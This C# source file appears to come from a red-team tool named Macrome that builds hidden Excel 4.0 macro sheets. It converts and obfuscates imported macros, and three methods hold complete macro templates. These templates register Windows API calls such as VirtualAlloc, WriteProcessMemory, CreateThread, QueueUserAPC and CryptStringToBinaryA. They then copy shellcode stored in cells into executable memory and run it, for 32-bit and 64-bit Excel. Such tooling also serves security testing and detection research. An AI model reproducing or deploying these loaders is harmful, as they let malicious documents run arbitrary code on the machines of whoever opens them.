using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.xls.XlsFileFormat.Records;

namespace Macrome
{
    public static class MacroPatterns
    {
        public const string MacroColumnSeparator = ";;;;;";
        public const string InstaEvalMacroPrefix = "%%%%%";
        public const string DefaultVariableName = "šœƒ";

        //Excel variable names must start with a valid letter, then they can include numbers
        private static bool IsValidVariableNameCharacter(char c, bool allowNumbers = false)
        {
            //A-Z, a-z, ƒ (131), Š(140), Ž(142), š(154), œ(156), ž(158), Ÿ(159), ª(170), µ(181), º(186)
            //Everything equal to or past 192 except ×(215) and ÷(247)
            if (c >= 'A' && c <= 'Z') return true;
            if (c >= 'a' && c <= 'z') return true;

            if (allowNumbers && (c >= '0' && c <= '9')) return true;

            if (c == (char) 215 || c == (char) 247) return false;

            int[] validCharCodes = new int[] {131, 140, 142, 154, 156, 158, 159, 170, 181, 186};
            if (validCharCodes.Any(code => c == (char) code)) return true;

            if ((int) c >= 192) return true;

            return false;
        }

        private static bool LooksLikeVariableAssignment(string formula)
        {
            try
            {
                //Make sure the first character isn't a number, but is a valid variable character
                if (IsValidVariableNameCharacter(formula[0]))
                {
                    char firstNonVariableCharacter =
                        formula.SkipWhile(c => IsValidVariableNameCharacter(c, true)).First();
                    if (firstNonVariableCharacter == '=')
                    {
                        return true;
                    }
                }
            }
            catch (Exception)
            {
                //If every character is a valid variable name, then .First() will return nothing
            }

            return false;
        }


        /// <summary>
        /// Refactor/Replace formulas using ACTIVE.CELL + SELECT to use something
        /// that's more friendly for multi-sheet excel docs.
        /// </summary>
        /// <param name="cellFormula"></param>
        /// <param name="variableName"></param>
        /// <returns></returns>
        public static string ReplaceSelectActiveCellFormula(string cellFormula, string variableName = DefaultVariableName)
        {
            if (cellFormula.Contains("ACTIVE.CELL()"))
            {
                cellFormula = cellFormula.Replace("ACTIVE.CELL()", variableName);
            }

            string selectRegex = @"=SELECT\(.*?\)";
            string selectRelativeRegex = @"=SELECT\(.*(R(\[\d+\]){0,1}C(\[\d+\]){0,1}).*?\)";

            Regex sRegex = new Regex(selectRegex);
            Regex srRegex = new Regex(selectRelativeRegex);
            Match sRegexMatch = sRegex.Match(cellFormula);
            if (sRegexMatch.Success)
            {
                Match srRegexMatch = srRegex.Match(cellFormula);
                string selectStringMatch = sRegexMatch.Value;
                //We have a line like =SELECT(,"R[1]C")
                if (srRegexMatch.Success)
                {
                    string relAddress = srRegexMatch.Groups[1].Value;
                    string relReplace = cellFormula.Replace(selectStringMatch,
                        string.Format("{0}=ABSREF(\"{1}\",{0})", variableName, relAddress));
                    return relReplace;
                }
                //We have a line like =SELECT(B1:B111,B1)
                else
                {
                    string targetCell = selectStringMatch.Split(",").Last().Split(')').First();
                    string varAssign = cellFormula.Replace(selectStringMatch,
                        string.Format("{0}={1}", variableName, targetCell));
                    return varAssign;
                }
            }

            return cellFormula;
        }

        public static string ConvertA1StringToR1C1String(string cellFormula)
        {
            //Remap A1 style references to R1C1 (but ignore anything followed by a " in case its inside an EVALUATE statement)
            string a1pattern = @"([A-Z]{1,2}\d{1,5})";
            Regex rg = new Regex(a1pattern);
            MatchCollection matches = rg.Matches(cellFormula);
            int stringLenChange = 0;

            //Iterate through each match and then replace it at its offset. We iterate through 
            //each case manually to prevent overlapping cases from double replacing - ex: SELECT(B1:B111,B1)
            foreach (var match in matches)
            {
                string matchString = ((Match)match).Value;
                string replaceContent = ExcelHelperClass.ConvertA1ToR1C1(matchString);
                //As we change the string, these indexes will go out of sync, track the size delta to make sure we resync positions
                int matchIndex = ((Match)match).Index + stringLenChange;

                //If the match is followed by a ", then ignore it
                int followingIndex = matchIndex + matchString.Length;
                if (followingIndex < cellFormula.Length && cellFormula[followingIndex] == '"')
                {
                    continue;
                }

                //LINQ replacement for python string slicing
                cellFormula = new string(cellFormula.Take(matchIndex).
                    Concat(replaceContent.ToArray()).
                    Concat(cellFormula.TakeLast(cellFormula.Length - matchIndex - matchString.Length)).ToArray());

                stringLenChange += (replaceContent.Length - matchString.Length);
            }

            return cellFormula;
        }

        private static string ImportCellFormula(string cellFormula)
        {
            if (cellFormula.Length == 0) return cellFormula;

            string newCellFormula = cellFormula;

            //Unescape the "s if we are looking at a CellFormula that has been escaped
            if (newCellFormula.StartsWith('"'))
            {
                //Strip the outer quotes
                newCellFormula = new string(newCellFormula.Skip(1).Take(newCellFormula.Length - 2).ToArray());

                //Escape the inside content
                newCellFormula = ExcelHelperClass.UnescapeFormulaString(newCellFormula);
            }

            //Replace any uses of SELECT and ACTIVE.CELL with variable usage to better enable the sheet being hidden
            //Mainly for use with importing EXCELntDonut macros
            newCellFormula = ReplaceSelectActiveCellFormula(newCellFormula);

            //FORMULA requires R1C1 strings
            newCellFormula = ConvertA1StringToR1C1String(newCellFormula);

            int charReplacements = 0;
            //Remap CHAR() to actual bytes
            for (int i = 1; i <= 255; i += 1)
            {
                int oldLength = newCellFormula.Length;
                newCellFormula = newCellFormula.Replace(string.Format("CHAR({0})&", i), "" + (char) i);
                newCellFormula = newCellFormula.Replace(string.Format("CHAR({0})", i), "" + (char)i);

                //Update our poor heuristic for when we're getting a cell that is just CHAR()&CHAR()&CHAR()&CHAR()...
                if (oldLength != newCellFormula.Length)
                {
                    double lengthDelta = oldLength - newCellFormula.Length;
                    charReplacements += (int)Math.Floor(lengthDelta / 6.0);
                }
            }
            
            //Arbitrary metric to determine if we should convert this to a string cell vs. formula cell
            if (charReplacements > 3 && newCellFormula[0] == '=')
            {
                newCellFormula = new string(newCellFormula.Skip(1).ToArray());

                //Excel cells will also check to see if we are a variable assignment cell:
                //if we have valid variable letters before an =, it will process the assignment value
                bool looksLikeVariableAssignment = LooksLikeVariableAssignment(newCellFormula);

                //If we have a raw string content that starts with = or @, we can wrap this with ="" and it will work
                //If the string content is already 255 bytes though, this won't work (FORMULA will fail trying to write the 258 byte string)
                //If we're close to the limit then populate the cell with =CHAR(w/e)&Ref to cell with remainder of the content
                if (newCellFormula.StartsWith('=') || newCellFormula.StartsWith('@') || looksLikeVariableAssignment)
                {
                    //Need to make sure there's room for inserting 3 more characters =""
                    if (newCellFormula.Length >= 255 - 3)
                    {
                        //If this is a max length cell (common with 255 byte increments of shellcode)
                        //then mark the macro with a marker and we'll break it into two cells when we're building the sheet
                        return FormulaHelper.TOOLONGMARKER + newCellFormula;
                    }
                    else
                    {
                        newCellFormula = string.Format("=\"{0}\"", newCellFormula);
                    }
                    
                }
            }
            else
            {
                //TODO Use a proper logging package and log this as DEBUG info
                // Console.WriteLine(newCellFormula);
            }

            if (newCellFormula.Length > 255)
            {
                throw new ArgumentException(string.Format("Imported Cell Formula is too long - length must be 255 or less:\n{0}", newCellFormula));
            }


            return newCellFormula;
        }

        // Imported Macros that perform obfuscation or contain binary information stored via
        // =CHAR() can create a situation where the =FORMULA() function will not work.
        // Technically a cell can only contain up to 255 characters of string content -
        // this limitation also applies to FORMULA input. So while a string of A&B&C&D&E&...
        // can technically go up to 8192 characters in length in a cell, the output must
        // still only be 255 characters or the result of the formula will be #VALUE!.
        // Unfortunately this means we can't use FORMULA to reproduce all valid
        // string content either - an 8192 character formula doesn't fit into 255 characters
        // so FORMULA will reject it.
        // 
        // In order to support macros which contain binary information and/or have been
        // slightly obfuscated, we need to manually convert the CHAR() output back into
        // the original binary characters. If this still isn't enough and a single cell
        // is > 255 characters, we need to reject the macro input and throw an error.
        // 
        // Additionally, any A1 references must be changed to R1C1 style. Not sure
        // why this is the case, but this seems to be the default for FORMULA() invocations.

        /// <summary>
        /// Converts a series of Excel 4 Macros into a format that Macrome can write to a hidden Macro sheet.
        /// </summary>
        /// <param name="macrosToImport">A list of strings containing macros. Each string represents a row. Cells are separated by semicolons.</param>
        /// <returns></returns>
        public static List<String> ImportMacroPattern(List<string> macrosToImport)
        {
            List<string> importedMacros = new List<string>();

            foreach (var macro in macrosToImport)
            {
                List<string> cellContent = macro.Split(";").ToList();
                //Replace the single ; separator with an unlikely separator like ;;;;; since shellcode can contain a single ;
                string importedMacro = string.Join(MacroColumnSeparator, cellContent.Select(ImportCellFormula));
                importedMacros.Add(importedMacro);
            }

            return importedMacros;
        }

        public static List<String> GetX86GetBinaryLoaderPattern(List<string> preamble, string macroSheetName)
        {
            int offset;
            if (preamble.Count == 0)
            {
                offset = 1;
            } else
            {
                offset = preamble.Count + 1;
            }
            //TODO Autocalculate these values at generation time
            //These variables assume certain positions in generated macros
            //Col 1 is our obfuscated payload
            //Col 2 is our actual macro set defined below
            //Col 3 is a separated set of cells containing a binary payload, ends with the string END
            string lengthCounter = String.Format("R{0}C40", offset);
            string offsetCounter = String.Format("R{0}C40", offset + 1);
            string dataCellRef = String.Format("R{0}C40", offset + 2);
            string dataCol = "C2";

            //Expects our invocation of VirtualAlloc to be on row 5, but this will change if the macro changes
            string baseMemoryAddress = String.Format("R{0}C1", preamble.Count + 4); //for some reason this only works when its count, not offset

            //TODO [Stealth] Add VirtualProtect so we don't call VirtualAlloc with RWX permissions
            //TODO [Functionality] Apply x64 support changes from https://github.com/outflanknl/Scripts/blob/master/ShellcodeToJScript.js
            //TODO [Functionality] Add support for .NET payloads (https://docs.microsoft.com/en-us/dotnet/core/tutorials/netcore-hosting, https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/)
            List<string> macros = new List<string>()
            {
                "=REGISTER(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"VA\",,1,0)",
                "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CT\",,1,0)",
                "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WPM\",,1,0)",
                "=VA(0,10000000,4096,64)", //Referenced by baseMemoryAddress
                string.Format("=SET.VALUE({0}!{1}, 0)", macroSheetName, lengthCounter),
                string.Format("=SET.VALUE({0}!{1},1)", macroSheetName, offsetCounter),
                string.Format("=FORMULA(\"={0}!R\"&{0}!{1}&\"{2}\",{0}!{3})", macroSheetName, offsetCounter, dataCol, dataCellRef),
                string.Format("=WHILE(GET.CELL(5,{0}!{1})<>\"END\")", macroSheetName, dataCellRef),
                string.Format("=WPM(-1,{0}!{1}+{0}!{2},{0}!{3},LEN({0}!{3}),0)", macroSheetName, baseMemoryAddress, lengthCounter, dataCellRef),
                string.Format("=SET.VALUE({0}!{1}, {0}!{1} + 1)", macroSheetName, offsetCounter),
                string.Format("=SET.VALUE({0}!{1}, {0}!{1} + LEN({0}!{2}))", macroSheetName, lengthCounter, dataCellRef),
                string.Format("=FORMULA(\"={0}!R\"&{0}!{1}&\"{2}\",{0}!{3})", macroSheetName, offsetCounter, dataCol, dataCellRef),
                "=NEXT()",
                //Execute our Payload
                string.Format("=CT(0,0,{0}!{1},0,0,0)", macroSheetName, baseMemoryAddress),
                "=WAIT(NOW()+\"00:00:03\")",
                "=HALT()"
            };
            if (preamble.Count > 0)
            {
                return preamble.Concat(macros).ToList();
            }
            return macros;
        }

        public static List<String> GetMultiPlatformBinaryPattern(List<string> preamble, string macroSheetName)
        {
            int offset;
            if (preamble.Count == 0)
            {
                offset = 1;
            }
            else
            {
                offset = preamble.Count + 1;
            }


            //These variables assume certain positions in generated macros
            //Col 1 is our main logic
            //Col 2 is our x86 payload, terminated by END
            //Col 3 is our x64 payload, terminated by END
            string x86CellStart = string.Format("R{0}C1", offset + 4);     //A5
            string x64CellStart = string.Format("R{0}C1", offset + 15);    //A16
            string variableName = DefaultVariableName; 
            string x86PayloadCellStart = "R1C2";  //B1
            string x64PayloadCellStart = "R1C3";  //C1
            string rowsWrittenCell = "R1C4";      //D1
            string lengthOfCurrentCell = "R2C4";  //D2
            //Happens to be the same cell right now
            string x86AllocatedMemoryBase = x86CellStart;
            string x64AllocatedMemoryBase = string.Format("R{0}C1", offset + 16); //A17

            List<string> macros = new List<string>()
            {
                "=REGISTER(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"Valloc\",,1,9)",
                "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WProcessMemory\",,1,9)",
                "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CThread\",,1,9)",
                string.Format("=IF(ISNUMBER(SEARCH(\"32\",GET.WORKSPACE(1))),GOTO({0}),GOTO({1}))",x86CellStart, x64CellStart),
                "=Valloc(0,10000000,4096,64)",
                string.Format("{0}={1}", variableName, x86PayloadCellStart),
                string.Format("=SET.VALUE({0},0)", rowsWrittenCell),
                string.Format("=WHILE({0}<>\"END\")", variableName),
                string.Format("=SET.VALUE({0},LEN({1}))", lengthOfCurrentCell, variableName),
                string.Format("=WProcessMemory(-1,{0}+({1}*255),{2},LEN({2}),0)", x86AllocatedMemoryBase, rowsWrittenCell, variableName),
                string.Format("=SET.VALUE({0},{0}+1)", rowsWrittenCell),
                string.Format("{0}=ABSREF(\"R[1]C\",{0})",variableName),
                "=NEXT()",
                string.Format("=CThread(0,0,{0},0,0,0)", x86AllocatedMemoryBase),
                "=HALT()",
                "1342439424", //Base memory address to brute force a page
                "0",
                string.Format("=WHILE({0}=0)", x64AllocatedMemoryBase),
                string.Format("=SET.VALUE({0},Valloc({1},10000000,12288,64))", x64AllocatedMemoryBase, x64CellStart),
                string.Format("=SET.VALUE({0},{0}+262144)", x64CellStart),
                "=NEXT()",
                "=REGISTER(\"Kernel32\",\"RtlCopyMemory\",\"JJCJ\",\"RTL\",,1,9)",
                "=REGISTER(\"Kernel32\",\"QueueUserAPC\",\"JJJJ\",\"Queue\",,1,9)",
                "=REGISTER(\"ntdll\",\"NtTestAlert\",\"J\",\"Go\",,1,9)",
                string.Format("{0}={1}", variableName, x64PayloadCellStart),
                string.Format("=SET.VALUE({0},0)", rowsWrittenCell),
                string.Format("=WHILE({0}<>\"END\")", variableName),
                string.Format("=SET.VALUE({0},LEN({1}))", lengthOfCurrentCell, variableName),
                string.Format("=RTL({0}+({1}*255),{2},LEN({2}))", x64AllocatedMemoryBase, rowsWrittenCell, variableName),
                string.Format("=SET.VALUE({0},{0}+1)",rowsWrittenCell),
                string.Format("{0}=ABSREF(\"R[1]C\",{0})", variableName),
                "=NEXT()",
                string.Format("=Queue({0},-2,0)", x64AllocatedMemoryBase),
                "=Go()",
                string.Format("=SET.VALUE({0},0)",x64AllocatedMemoryBase),
                "=HALT()"
            };
            
            if (preamble.Count > 0)
            {
                return preamble.Concat(macros).ToList();
            }

            return macros;
        }
        
        public static List<String> GetBase64DecodePattern(List<string> preamble)
        {
            int offset;
            if (preamble.Count == 0)
            {
                offset = 1;
            }
            else
            {
                offset = preamble.Count + 1;
            }


            //These variables assume certain positions in generated macros
            //Col 1 is our main logic
            string registerImportsFunction = string.Format("R{0}C1", offset+1);     //A2
            string allocateMemoryFunction  = string.Format("R{0}C1", offset+5);   //A6
            string writeLoopFunction       = string.Format("R{0}C1", offset+12);  //A13
            string defineFunctionsFunction = string.Format("R{0}C1", offset+26);  //A27
            string actualStart             = string.Format("R{0}C1", offset + 30); //A31
            //Col 2 is our x86 payload, terminated by END
            string x86Payload = string.Format("R1C{0}", 2);
            //Col 3 is our x64 payload, terminated by END
            string x64Payload = string.Format("R1C{0}", 3);

            List<string> macros = new List<string>()
            {
                string.Format("=GOTO({0})",actualStart),
                "=REGISTER(\"kernel32\", \"VirtualAlloc\", \"JJJJJ\", \"valloc\", , 1, 9)",
                "=REGISTER(\"crypt32\",\"CryptStringToBinaryA\",\"JCJJJNCC\",\"cryptString\",,1,9)",
                "=REGISTER(\"shlwapi\",\"SHCreateThread\",\"JJCJJ\",\"shCreateThread\",,1,9)",
                "=RETURN()",
                "curAddr=1342439424", // Set our start address at 0x50000000
                "targetAddr=0",
                "=WHILE(targetAddr=0)",
                "targetAddr=valloc(curAddr,10000000,12288,576)", // Allocate 10MB for shellcode
                "curAddr=curAddr+262144", // Iterate every 0x40000 bytes
                "=NEXT()",
                "=RETURN(targetAddr)",
                "=ARGUMENT(\"targetWriteAddr\",1)",
                "=ARGUMENT(\"curWriteRef\",8)",
                "=ARGUMENT(\"decryptKey\",2)",
                "curLoopWriteAddr=targetWriteAddr",
                "=WHILE(curWriteRef<>\"END\")",
                "=IF(LEN(decryptKey)>0)",
                "TODO-decryptionfunction",
                "=ELSE()",
                "=cryptString(curWriteRef,LEN(curWriteRef),1,curLoopWriteAddr,256,\"\",\"\")",
                "=END.IF()",
                "curLoopWriteAddr=curLoopWriteAddr+(3*LEN(curWriteRef)/4)",
                "curWriteRef=ABSREF(\"R[1]C\",curWriteRef)",
                "=NEXT()",
                "=RETURN(curLoopWriteAddr-targetWriteAddr)",
                string.Format("RegisterImports={0}", registerImportsFunction),
                string.Format("AllocateMemory={0}", allocateMemoryFunction),
                string.Format("WriteLoop={0}", writeLoopFunction),
                "=RETURN()",
                string.Format("={0}()", defineFunctionsFunction),
                "=RegisterImports()",
                "targetAddress=AllocateMemory()",
                string.Format("=IF(ISNUMBER(SEARCH(\"32\",GET.WORKSPACE(1))),SET.NAME(\"payload\",{0}),SET.NAME(\"payload\",{1}))", x86Payload, x64Payload),
                "bytesWritten=WriteLoop(targetAddress,payload,\"\")",
                "=shCreateThread(targetAddress,\"\",0,0)",
                "=HALT()"
            };
            
            if (preamble.Count > 0)
            {
                return preamble.Concat(macros).ToList();
            }

            return macros;
        }
    }
}
